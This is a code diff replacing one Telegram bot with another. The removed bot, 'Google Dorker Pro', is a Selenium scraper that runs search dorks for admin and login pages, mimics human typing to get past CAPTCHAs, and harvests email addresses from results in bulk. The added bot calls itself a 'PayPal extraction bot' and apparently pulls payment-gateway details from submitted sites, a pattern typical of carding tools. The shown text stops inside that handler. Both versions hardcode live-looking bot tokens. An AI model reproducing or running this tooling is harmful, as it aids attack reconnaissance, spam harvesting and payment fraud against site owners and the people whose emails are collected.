@@ -1,920 +1,1023 @@
-import os
-import re
-import json
+import telebot
 import time
-import random
-import sqlite3
-import hashlib
-import requests
-import asyncio
-import logging
-from pathlib import Path
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, urlunparse
+import threading
+from telebot import types
+import requests, random, json, string, re, base64
+from telebot.types import LabeledPrice
+from datetime import datetime, timedelta
+import os
+import html
+from user_agent import generate_user_agent
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from urllib.parse import urlparse
 
-# Selenium & Webdriver Imports
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
-from fake_useragent import UserAgent
+# === بيانات البوت ===
+token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
+bot = telebot.TeleBot(token, parse_mode="HTML")
+admin = 6843321125
+myid = ['6843321125']
+admins = ['6843321125']
+OWNER_ID = 6843321125
 
-# Telegram Bot Imports
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    ContextTypes,
-    filters
-)
+waiting_users = {}
+reply_mode = {}
 
-# Logging Setup
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
 
-# ==============================================================================
-# CLASS: GoogleDorkerPro (المحرك الرئيسي المطور)
-# ==============================================================================
+if not os.path.exists('blockusers.txt'):
+    with open('blockusers.txt', 'w') as f:
+        f.write('')
 
-class GoogleDorkerPro:
-    def __init__(self, headless=True, ultra_slow=False):
-        self.driver = None
-        self.found_urls = set()
-        self.stats_file = "dork_stats.json"
-        self.ua = UserAgent()
-        self.current_dork = ""
-        self.current_page = 1
-        self.dork_results = {}
-        self.start_time = None
-        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
-        self.MAX_PAGES = 50
-        self.total_dorks_processed = 0
-        self.captcha_count = 0
-        self.processed_dorks = []
-        self.current_dork_index = 0
-        self.headless = headless
-        self.ultra_slow = ultra_slow
-        self.delay_between_actions = 1 if not ultra_slow else 3
-        self.emails_found = set()
-        
-        self.blacklist_domains = set()
-        self.whitelist_domains = set()
-        
-        os.makedirs("results", exist_ok=True)
-        os.makedirs("sessions", exist_ok=True)
-        os.makedirs("emails", exist_ok=True)
-        
-        self.output_file = f"results/{self.session_id}_results.txt"
-        self.emails_file = f"emails/emails_{self.session_id}.txt"
-        
-        self.load_existing_urls()
-        self.load_stats()
-        self.load_filters()
-        self.init_database()
-    
-    def load_existing_urls(self):
-        results_dir = "results"
-        if os.path.exists(results_dir):
-            for file in os.listdir(results_dir):
-                if file.endswith("_results.txt"):
-                    filepath = os.path.join(results_dir, file)
-                    try:
-                        with open(filepath, 'r', encoding='utf-8') as f:
-                            for line in f:
-                                match = re.search(r'https?://[^\s]+', line)
-                                if match:
-                                    self.found_urls.add(match.group())
-                    except Exception:
-                        pass
-        print(f"📂 [SYSTEM] Loaded {len(self.found_urls)} existing URLs.")
-    
-    def load_stats(self):
-        if os.path.exists(self.stats_file):
-            try:
-                with open(self.stats_file, 'r', encoding='utf-8') as f:
-                    self.dork_results = json.load(f)
-            except Exception:
-                self.dork_results = {}
-    
-    def save_stats(self):
-        with open(self.stats_file, 'w', encoding='utf-8') as f:
-            json.dump(self.dork_results, f, ensure_ascii=False, indent=2)
-    
-    def load_filters(self):
-        if os.path.exists("blacklist.txt"):
-            with open("blacklist.txt", 'r', encoding='utf-8') as f:
-                self.blacklist_domains.update(line.strip() for line in f if line.strip())
-            print(f"🚫 [FILTER] Loaded {len(self.blacklist_domains)} blacklisted domains.")
-        
-        if os.path.exists("whitelist.txt"):
-            with open("whitelist.txt", 'r', encoding='utf-8') as f:
-                self.whitelist_domains.update(line.strip() for line in f if line.strip())
-            print(f"✅ [FILTER] Loaded {len(self.whitelist_domains)} whitelisted domains.")
-    
-    def init_database(self):
-        self.db_file = f"results/dorker_{self.session_id}.db"
-        conn = sqlite3.connect(self.db_file)
-        cursor = conn.cursor()
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS urls (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                url TEXT UNIQUE,
-                domain TEXT,
-                timestamp TEXT,
-                dork TEXT,
-                status_code INTEGER,
-                is_alive BOOLEAN
-            )
-        ''')
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dorks (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                dork TEXT,
-                urls_count INTEGER,
-                timestamp TEXT
-            )
-        ''')
-        conn.commit()
-        conn.close()
-        print(f"💾 [DATABASE] Initialized: {self.db_file}")
-    
-    def save_to_database(self, url, dork="", status_code=None, is_alive=None):
-        try:
-            conn = sqlite3.connect(self.db_file)
-            cursor = conn.cursor()
-            domain = urlparse(url).netloc
-            cursor.execute('''
-                INSERT OR REPLACE INTO urls (url, domain, timestamp, dork, status_code, is_alive)
-                VALUES (?, ?, ?, ?, ?, ?)
-            ''', (url, domain, datetime.now().isoformat(), dork, status_code, is_alive))
-            conn.commit()
-            conn.close()
-        except Exception:
-            pass
-    
-    def save_session(self):
-        session_data = {
-            'found_urls': list(self.found_urls),
-            'processed_dorks': self.processed_dorks,
-            'current_dork_index': self.current_dork_index,
-            'session_id': self.session_id,
-            'timestamp': datetime.now().isoformat(),
-            'total_urls': len(self.found_urls)
-        }
-        session_file = f"sessions/session_{self.session_id}.json"
-        with open(session_file, 'w', encoding='utf-8') as f:
-            json.dump(session_data, f, ensure_ascii=False, indent=2)
-        print(f"💾 [SESSION] Saved: {session_file}")
-    
-    def check_url_status(self, url):
-        try:
-            headers = {'User-Agent': self.ua.random}
-            response = requests.head(url, headers=headers, timeout=5, allow_redirects=True)
-            return url, response.status_code, response.status_code == 200
-        except Exception:
-            return url, 0, False
-    
-    def check_all_urls(self):
-        print("\n🔍 [CHECKER] Verifying URL accessibility...")
-        alive_urls = []
-        dead_urls = []
-        
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = {executor.submit(self.check_url_status, url): url for url in self.found_urls}
-            
-            for i, future in enumerate(as_completed(futures), 1):
-                url, status, is_alive = future.result()
-                self.save_to_database(url, status_code=status, is_alive=is_alive)
-                if is_alive:
-                    alive_urls.append(url)
-                else:
-                    dead_urls.append(url)
-        
-        with open(f"results/alive_{self.session_id}.txt", 'w', encoding='utf-8') as f:
-            for url in alive_urls:
-                f.write(f"{url}\n")
-        
-        return alive_urls, dead_urls
-    
-    def extract_emails_from_page(self):
-        try:
-            page_text = self.driver.page_source
-            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-            emails = set(re.findall(email_pattern, page_text))
-            
-            exclude = ['example.com', 'test.com', 'noreply', 'no-reply', 'support', 'admin', 'sentry.io', 'domain.com']
-            emails = [e for e in emails if not any(x in e.lower() for x in exclude)]
-            
-            with open(self.emails_file, 'a', encoding='utf-8') as f:
-                for email in emails:
-                    if email not in self.emails_found:
-                        f.write(f"{email}\n")
-                        self.emails_found.add(email)
-            
-            return emails
-        except Exception:
-            return set()
-    
-    def export_to_excel(self):
-        try:
-            import openpyxl
-            from openpyxl.styles import Font, PatternFill, Alignment
-            
-            wb = openpyxl.Workbook()
-            ws = wb.active
-            ws.title = "Dork Results"
-            
-            headers = ['#', 'URL', 'Domain', 'Timestamp']
-            for col, header in enumerate(headers, 1):
-                cell = ws.cell(row=1, column=col, value=header)
-                cell.font = Font(bold=True, color="FFFFFF")
-                cell.fill = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")
-                cell.alignment = Alignment(horizontal="center")
-            
-            for i, url in enumerate(self.found_urls, 1):
-                ws.cell(row=i+1, column=1, value=i)
-                ws.cell(row=i+1, column=2, value=url)
-                ws.cell(row=i+1, column=3, value=urlparse(url).netloc)
-                ws.cell(row=i+1, column=4, value=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-            
-            ws.column_dimensions['B'].width = 60
-            ws.column_dimensions['C'].width = 30
-            
-            excel_file = f"results/dork_results_{self.session_id}.xlsx"
-            wb.save(excel_file)
-            return excel_file
-        except ImportError:
-            return None
-    
-    def generate_advanced_report(self):
-        try:
-            from reportlab.lib import colors
-            from reportlab.lib.pagesizes import letter
-            from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
-            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
-            from reportlab.lib.units import inch
-            
-            pdf_file = f"results/report_{self.session_id}.pdf"
-            doc = SimpleDocTemplate(pdf_file, pagesize=letter)
-            styles = getSampleStyleSheet()
-            story = []
-            
-            title_style = ParagraphStyle('CustomTitle', parent=styles['Heading1'], fontSize=22, textColor=colors.HexColor('#1F4E79'))
-            story.append(Paragraph("Google Dorker Pro - Intelligence Report", title_style))
-            story.append(Spacer(1, 0.2*inch))
-            
-            duration = datetime.now() - self.start_time if self.start_time else datetime.now() - datetime.now()
-            seconds = int(duration.total_seconds())
-            
-            stats_data = [
-                ['Metric', 'Value'],
-                ['Total URLs Found', str(len(self.found_urls))],
-                ['Dorks Processed', str(self.total_dorks_processed)],
-                ['Pages Scanned', str(self.current_page)],
-                ['Captchas Enriched', str(self.captcha_count)],
-                ['Emails Extracted', str(len(self.emails_found))],
-                ['Duration', f"{seconds // 60}m {seconds % 60}s"],
-            ]
-            
-            table = Table(stats_data)
-            table.setStyle(TableStyle([
-                ('BACKGROUND', (0, 0), (1, 0), colors.HexColor('#1F4E79')),
-                ('TEXTCOLOR', (0, 0), (1, 0), colors.whitesmoke),
-                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
-                ('GRID', (0, 0), (-1, -1), 1, colors.grey)
-            ]))
-            story.append(table)
-            
-            doc.build(story)
-            return pdf_file
-        except Exception:
-            return None
-    
-    def create_driver(self):
-        chrome_options = Options()
-        chrome_options.add_argument("--headless=new")
-        chrome_options.add_argument("--disable-gpu")
-        chrome_options.add_argument("--no-sandbox")
-        chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-extensions")
-        chrome_options.add_argument("--window-size=1920,1080")
-        chrome_options.add_argument("--lang=en-US,en")
-        chrome_options.add_argument("--remote-debugging-port=9222")
-        chrome_options.add_argument("--disable-setuid-sandbox")
-        
-        for bin_path in ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]:
-            if os.path.exists(bin_path):
-                chrome_options.binary_location = bin_path
-                break
 
-        try:
-            random_ua = self.ua.random
-            chrome_options.add_argument(f"user-agent={random_ua}")
-        except Exception:
-            chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-
-        driver_path = None
-        for path in ["/usr/bin/chromedriver", "/usr/lib/chromium-browser/chromedriver"]:
-            if os.path.exists(path):
-                driver_path = path
-                break
-
-        if driver_path:
-            service = Service(executable_path=driver_path)
-        else:
-            service = Service(ChromeDriverManager().install())
-            
-        self.driver = webdriver.Chrome(service=service, options=chrome_options)
-        self.driver.set_page_load_timeout(30)
-        return self.driver
+@bot.message_handler(commands=["start"])
+def start(message):
+    with open("blockusers.txt", "r") as file:
+        blocked = file.read().splitlines()
+    if str(message.from_user.id) in blocked:
+        bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
+        return 
     
-    def clean_url(self, url):
-        try:
-            parsed = urlparse(url)
-            clean = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
-            if len(clean) > 250:
-                return None
-            return clean
-        except Exception:
-            return None
+    user_id = message.from_user.id
+    userr = message.from_user.first_name
+    username = message.from_user.username
+
+    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.
+
+[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
+[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
+[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below
+
+[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
     
-    def is_allowed_url(self, url):
-        domain = urlparse(url).netloc
-        if domain in self.blacklist_domains:
-            return False
-        if self.whitelist_domains and domain not in self.whitelist_domains:
-            return False
-        return True
+    FRA = types.InlineKeyboardMarkup(row_width=2)
+    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
+    FRA.add(Yes22)
     
-    def save_url(self, url, source_dork=""):
-        if not self.is_allowed_url(url):
-            return False
-        
-        with open(self.output_file, 'a', encoding='utf-8') as f:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            dork_hash = hashlib.md5(source_dork.encode()).hexdigest()[:8] if source_dork else "unknown"
-            f.write(f"[{timestamp}] [{dork_hash}] {url}\n")
-        
-        self.found_urls.add(url)
-        self.save_to_database(url, dork=source_dork)
-        return True
-    
-    def save_dork_results(self, dork, urls_count):
-        dork_hash = hashlib.md5(dork.encode()).hexdigest()
-        self.dork_results[dork_hash] = {
-            'dork_preview': dork[:100],
-            'urls_found': urls_count,
-            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            'pages_searched': self.current_page,
-            'session_id': self.session_id
-        }
-        self.save_stats()
-    
-    def detect_captcha(self):
-        try:
-            captcha_selectors = [
-                "//iframe[contains(@src, 'recaptcha')]",
-                "//iframe[contains(@src, 'captcha')]",
-                "//div[contains(@class, 'g-recaptcha')]",
-                "//*[contains(text(), 'unusual traffic')]",
-                "//*[contains(text(), 'verify you are human')]",
-            ]
-            for selector in captcha_selectors:
-                if self.driver.find_elements(By.XPATH, selector):
-                    self.captcha_count += 1
-                    return True
-            return False
-        except Exception:
-            return False
-    
-    def handle_captcha(self):
-        if self.detect_captcha():
-            print(f"⚠️ [CAPTCHA] Detected CAPTCHA #{self.captcha_count}")
-            time.sleep(3)
-            return self.restore_search()
-        return True
-    
-    def restore_search(self):
-        try:
-            if "google.com/search" not in self.driver.current_url:
-                self.driver.get("https://www.google.com")
-                time.sleep(2)
-                
-                search_box = WebDriverWait(self.driver, 10).until(
-                    EC.presence_of_element_located((By.NAME, "q"))
-                )
-                search_box.clear()
-                for char in self.current_dork:
-                    search_box.send_keys(char)
-                    time.sleep(random.uniform(0.005, 0.02))
-                search_box.send_keys(Keys.RETURN)
-                time.sleep(3)
-            return True
-        except Exception as e:
-            print(f"⚠️ [RESTORE ERROR] {str(e)}")
-            return False
-    
-    def get_next_page_url(self):
-        try:
-            next_selectors = [
-                "//a[@aria-label='Next page']",
-                "//a[@aria-label='الصفحة التالية']",
-                "//a[contains(@id, 'pnnext')]",
-                "//span[text()='Next']/parent::a"
-            ]
-            for selector in next_selectors:
-                elements = self.driver.find_elements(By.XPATH, selector)
-                for element in elements:
-                    if element.is_enabled():
-                        href = element.get_attribute("href")
-                        if href:
-                            return href
-            
-            current_url = self.driver.current_url
-            if 'start=' in current_url:
-                return re.sub(r'start=\d+', f'start={self.current_page * 10}', current_url)
-            else:
-                return current_url + f'&start={self.current_page * 10}'
-        except Exception:
-            return None
-    
-    def extract_links(self):
-        links = set()
-        selectors = [
-            "a[jsname='UWckNb']",
-            "a[href^='http']:not([href*='google']):not([href*='youtube'])",
-            "div#search a[href^='http']",
-            "div.g a[href^='http']",
-            "div.yuRUbf a",
-        ]
-        
-        for selector in selectors:
-            try:
-                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
-                for elem in elements:
-                    try:
-                        href = elem.get_attribute("href")
-                        if href and href.startswith("http"):
-                            exclude_list = ['google.com', 'youtube.com', 'support.google', 'accounts.google', 'gstatic.com']
-                            if not any(x in href for x in exclude_list):
-                                clean = self.clean_url(href)
-                                if clean:
-                                    links.add(clean)
-                    except Exception:
-                        continue
-            except Exception:
-                continue
-        return links
-    
-    def show_statistics(self):
-        duration = datetime.now() - self.start_time if self.start_time else datetime.now() - datetime.now()
-        seconds = int(duration.total_seconds())
-        
-        stats_msg = "🔥 [GOOGLE DORKER PRO - ENGINE STATS] 🔥\n"
-        stats_msg += f"----------------------------------------\n"
-        stats_msg += f"✅ Total URLs Collected : {len(self.found_urls)}\n"
-        stats_msg += f"📧 Total Emails Found   : {len(self.emails_found)}\n"
-        stats_msg += f"⏱️ Active Time         : {seconds // 60}m {seconds % 60}s\n"
-        stats_msg += f"📄 Pages Processed     : {self.current_page}\n"
-        stats_msg += f"🤖 Captchas Enriched   : {self.captcha_count}\n"
-        stats_msg += f"🎯 Dorks Executed      : {self.total_dorks_processed}\n"
-        return stats_msg
-    
-    def search(self, dork):
-        self.current_dork = dork
-        self.current_page = 1
-        if self.start_time is None:
-            self.start_time = datetime.now()
-        self.total_dorks_processed += 1
-        self.processed_dorks.append(dork)
-        
-        if not self.driver:
-            self.create_driver()
-        
-        print(f"\n🔍 [EXEC] Searching #{self.total_dorks_processed}: {dork}")
-        
-        try:
-            self.driver.get("https://www.google.com")
-            time.sleep(random.uniform(2, 4) * self.delay_between_actions)
-            
-            try:
-                cookie_btn = WebDriverWait(self.driver, 4).until(
-                    EC.element_to_be_clickable((By.XPATH, "//button[contains(.,'Accept all') or contains(.,'Accept')]"))
-                )
-                cookie_btn.click()
-            except Exception:
-                pass
-            
-            search_box = WebDriverWait(self.driver, 10).until(
-                EC.presence_of_element_located((By.NAME, "q"))
-            )
-            
-            search_box.clear()
-            for char in dork:
-                search_box.send_keys(char)
-                time.sleep(random.uniform(0.005, 0.02) * self.delay_between_actions)
-            
-            search_box.send_keys(Keys.RETURN)
-            time.sleep(random.uniform(3, 5) * self.delay_between_actions)
-            
-            if not self.handle_captcha():
-                return 0
-            
-            pages_without_new = 0
-            urls_before = len(self.found_urls)
-            
-            while pages_without_new < 3 and self.current_page <= self.MAX_PAGES:
-                try:
-                    WebDriverWait(self.driver, 10).until(
-                        EC.presence_of_element_located((By.CSS_SELECTOR, "div#search, div.g"))
-                    )
-                except Exception:
-                    time.sleep(3)
-                
-                self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
-                time.sleep(0.5 * self.delay_between_actions)
-                
-                self.extract_emails_from_page()
-                new_links = self.extract_links()
-                
-                new_count = 0
-                for link in new_links:
-                    if link not in self.found_urls:
-                        if self.save_url(link, dork):
-                            new_count += 1
-                
-                if new_count == 0:
-                    pages_without_new += 1
-                else:
-                    pages_without_new = 0
-                
-                next_url = self.get_next_page_url()
-                if not next_url:
-                    break
-                
-                self.driver.get(next_url)
-                time.sleep(random.uniform(3, 6) * self.delay_between_actions)
-                
-                if not self.handle_captcha():
-                    break
-                
-                self.current_page += 1
-            
-            urls_found = len(self.found_urls) - urls_before
-            self.save_dork_results(dork, urls_found)
-            self.save_session()
-            return urls_found
-            
-        except Exception as e:
-            print(f"⚠️ [ENGINE ERROR] {str(e)}")
-            return 0
-    
-    def export_all_results(self):
-        excel_path = self.export_to_excel()
-        pdf_path = self.generate_advanced_report()
-        
-        txt_path = f"results/urls_only_{self.session_id}.txt"
-        with open(txt_path, 'w', encoding='utf-8') as f:
-            for url in sorted(self.found_urls):
-                f.write(f"{url}\n")
-        return txt_path, excel_path, pdf_path
-    
-    def close(self):
-        if self.driver:
-            self.save_session()
-            files = self.export_all_results()
-            self.driver.quit()
-            self.driver = None
-            return files
-        return None, None, None
+    video_url = 'https://t.me/C0CCOCOvjk/9'
+    bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)
 
-# ==============================================================================
-# TELEGRAM BOT CONTROLLER
-# ==============================================================================
+# === نظام المراسلة ===
+@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
+def feedback(call):
+    user_id = call.from_user.id
+    userr = call.from_user.first_name
+    Atty = types.InlineKeyboardMarkup(row_width=1)
+    back = types.InlineKeyboardButton("Back", callback_data="start")
+    Atty.add(back)
+    YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
+    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
+    waiting_users[user_id] = True
 
-BOT_TOKEN = "8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI"
+@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
+def get_user_msg(message):
+    user_id = message.from_user.id
+    name = message.from_user.first_name
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
+    bot.send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
+    kb2 = types.InlineKeyboardMarkup()
+    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
+    bot.send_message(user_id, "Your message has been sent.", reply_markup=kb2)
+    waiting_users.pop(user_id)
 
-user_states = {}
-dorker_instances = {}
-user_files_data = {}
+@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
+def start_reply(call):
+    user_id = int(call.data.split("_")[1])
+    reply_mode[call.from_user.id] = user_id
+    bot.send_message(call.from_user.id, "Write your reply now:")
 
-def get_main_keyboard():
-    keyboard = [
-        [
-            InlineKeyboardButton("🎯 بحث دورك فردي (/dork)", callback_data="mode_single"),
-            InlineKeyboardButton("📂 رفع ملف دوركات (.txt)", callback_data="mode_multi")
-        ],
-        [
-            InlineKeyboardButton("📊 عرض الإحصائيات", callback_data="show_stats"),
-            InlineKeyboardButton("⚡ فحص الروابط (Alive/Dead)", callback_data="check_urls")
-        ],
-        [
-            InlineKeyboardButton("📦 تصدير وتحميل الحصيلة", callback_data="export_files"),
-            InlineKeyboardButton("🛑 إيقاف وحفظ الجلسة", callback_data="stop_engine")
-        ]
-    ]
-    return InlineKeyboardMarkup(keyboard)
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
+def send_reply(message):
+    user_id = reply_mode[message.from_user.id]
+    bot.send_message(user_id, f"Admin response:\n\n{message.text}")
+    bot.send_message(OWNER_ID, "Reply sent.")
+    reply_mode.pop(message.from_user.id)
 
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_text = (
-        "🔥 *GOOGLE DORKER PRO - SHADOW EDITION v3.5* 🔥\n\n"
-        "⚡ *المحرك الذكي الأوتوماتيكي لاستخراج الروابط والبيانات*\n\n"
-        "🛠️ *الأوامر المتاحة:*\n"
-        "• `/dork <query>` - لبدء الفحص الفوري المباشر.\n"
-        "• أرسل ملف `.txt` يحتوي قائمة دوركات لبدء لوحة الفحص الجماعية.\n"
-        "• `/stats` - لعرض إحصائيات المحرك الحالية.\n"
-        "• `/help` - دليل الاستخدام السريع."
-    )
-    if update.message:
-        await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = (
-        "📖 *دليل التشغيل الاحترافي:*\n\n"
-        "1️⃣ **البحث الفردي المباشر:**\n"
-        "`/dork inurl:admin.php`\n\n"
-        "2️⃣ **رفع الملفات الجماعية:**\n"
-        "قم بإرسال ملف نصي `.txt` يحتوي على الدوركات (كل دورك في سطر).\n\n"
-        "3️⃣ **التصدير:**\n"
-        "يمكنك سحب النتائج فوراً بصيغ Text / Excel / PDF."
-    )
-    if update.message:
-        await update.message.reply_text(help_text, parse_mode="Markdown")
-
-async def dork_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    if not context.args:
-        if update.message:
-            await update.message.reply_text("⚠️ يرجى تزويد الاستعلام بعد الأمر، مثال:\n`/dork inurl:login.php`", parse_mode="Markdown")
-        return
-
-    dork_text = " ".join(context.args)
-    if update.message:
-        await update.message.reply_text(f"🚀 *بدء محرك الفحص الفردي الناري:*\n`{dork_text}`", parse_mode="Markdown")
-
-    if chat_id not in dorker_instances or dorker_instances[chat_id] is None:
-        dorker_instances[chat_id] = GoogleDorkerPro(headless=True, ultra_slow=False)
-
-    dorker = dorker_instances[chat_id]
-    loop = asyncio.get_running_loop()
-    added_now = await loop.run_in_executor(None, dorker.search, dork_text)
-
-    if update.message:
-        await update.message.reply_text(
-            f"✅ *اكتمل فحص الدورك!*\n"
-            f"➕ روابط مضافة حديثاً: `{added_now}`\n"
-            f"🌐 إجمالي الروابط في القاعدة: `{len(dorker.found_urls)}`",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
-        )
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    target_msg = update.message if update.message else (update.callback_query.message if update.callback_query else None)
-    
-    if chat_id in dorker_instances and dorker_instances[chat_id]:
-        stats = dorker_instances[chat_id].show_statistics()
-        if target_msg:
-            await target_msg.reply_text(f"```\n{stats}\n```", parse_mode="Markdown")
-    else:
-        if target_msg:
-            await target_msg.reply_text("❌ لا يوجد محرك شغال حالياً. ابدأ بالبحث أولاً!")
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.document:
-        return
-        
-    chat_id = update.effective_chat.id
-    document = update.message.document
-
-    if not document.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ يرجى رفع ملف نصي بتنسيق `.txt` فقط.")
-        return
-
-    await update.message.reply_text("📥 *جاري تحميل الملف وتصفية البيانات...*", parse_mode="Markdown")
-
-    file = await context.bot.get_file(document.file_id)
-    file_bytes = await file.download_as_bytearray()
-    content = file_bytes.decode('utf-8', errors='ignore')
-
-    raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
-    unique_lines = list(dict.fromkeys(raw_lines))
-
-    user_files_data[chat_id] = unique_lines
-
-    panel_text = (
-        "🔥 *لوحة التحكم بالملف المرفوع* 🔥\n\n"
-        f"📄 **اسم الملف:** `{document.file_name}`\n"
-        f"🔢 **إجمالي الأسطر:** `{len(raw_lines)}`\n"
-        f"✨ **الدوركات الصافية (بدون تكرار):** `{len(unique_lines)}`\n\n"
-        "اختر الإجراء المطلوب لبدء معالجة الدوركات واستخراج الروابط:"
+@bot.callback_query_handler(func=lambda call: call.data == "start")
+def back_to_start(call):
+    user_id = call.from_user.id
+    userr = call.from_user.first_name
+    username = call.from_user.username
+    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
+    FRA = types.InlineKeyboardMarkup(row_width=2)
+    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
+    FRA.add(Yes22)
+    from telebot.types import InputMediaPhoto
+    photo_url = 'https://t.me/C0CCOCOvjk/9'
+    bot.edit_message_media(
+        media=InputMediaPhoto(media=photo_url, caption=IU, parse_mode='HTML'),
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        reply_markup=FRA
     )
 
-    keyboard = [
-        [
-            InlineKeyboardButton("⚡ بدء الفحص الناري فوراً", callback_data="start_file_process"),
-            InlineKeyboardButton("🧹 تصفية وفلترة متقدمة", callback_data="filter_file_data")
-        ],
-        [
-            InlineKeyboardButton("❌ إلغاء القائمة", callback_data="cancel_file")
-        ]
-    ]
-
-    await update.message.reply_text(panel_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query or not query.message:
+# ============ أمر سحب PayPal (الكود الأصلي كما هو) ============
+@bot.message_handler(func=lambda m: m.text.lower().startswith('.paypal') or m.text.lower().startswith('/paypal'))
+def ali_al2(massege):
+    with open("blockusers.txt", "r") as file:
+        blocked = file.read().splitlines()
+    if str(massege.from_user.id) in blocked:
+        bot.send_message(massege.chat.id, 'The admin has blocked you.')
         return
-        
-    await query.answer()
-    chat_id = query.message.chat_id
-    data = query.data
 
-    if data == "mode_single":
-        await query.message.reply_text("📝 يمكنك استخدام الأمر الفوري:\n`/dork <الاستعلام>`\nأو أرسل الدورك مباشرة في الرسالة القادمة.", parse_mode="Markdown")
-        user_states[chat_id] = "WAITING_FOR_SINGLE_DORK"
+    ko = bot.reply_to(massege, "- The gate is being withdrawn ...").message_id
+    try:
+        parts = massege.text.split(maxsplit=1)
+        if len(parts) != 2:
+            bot.edit_message_text(
+                chat_id=massege.chat.id,
+                message_id=ko,
+                text='''- Please send the link like this:
 
-    elif data == "mode_multi":
-        await query.message.reply_text("📂 قم بإرسال ملف نصي `.txt` يحتوي على قائمة الدوركات مباشرة إلى المحادثة.")
-
-    elif data == "start_file_process":
-        dorks = user_files_data.get(chat_id, [])
-        if not dorks:
-            await query.message.reply_text("❌ لم يتم العثور على دوركات قيد الانتظار.")
+<code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
+                parse_mode="HTML"
+            )
             return
 
-        total_dorks = len(dorks)
-        await query.message.reply_text(f"🚀 *بدء معالجة {total_dorks} دورك عبر المحرك الخفي...*", parse_mode="Markdown")
+        link = parts[1].strip()
 
-        if chat_id not in dorker_instances or dorker_instances[chat_id] is None:
-            dorker_instances[chat_id] = GoogleDorkerPro(headless=True, ultra_slow=False)
-
-        dorker = dorker_instances[chat_id]
